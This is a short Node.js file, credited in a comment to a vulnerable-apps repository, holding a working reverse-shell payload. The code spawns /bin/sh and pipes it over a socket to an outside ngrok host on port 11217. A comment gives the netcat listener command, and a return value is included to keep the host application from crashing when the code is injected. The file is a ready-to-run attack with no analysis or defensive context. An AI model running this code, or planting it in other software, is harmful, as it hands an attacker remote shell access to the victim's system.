// Stolen from: https://github.com/appsecco/vulnerable-apps/tree/master/node-reverse-shell
// Nodejs reverse shell
// listen with: nc -vlnp 5555
// adjust the ip address obviously

(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(11217, "0.tcp.sa.ngrok.io", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})(); 
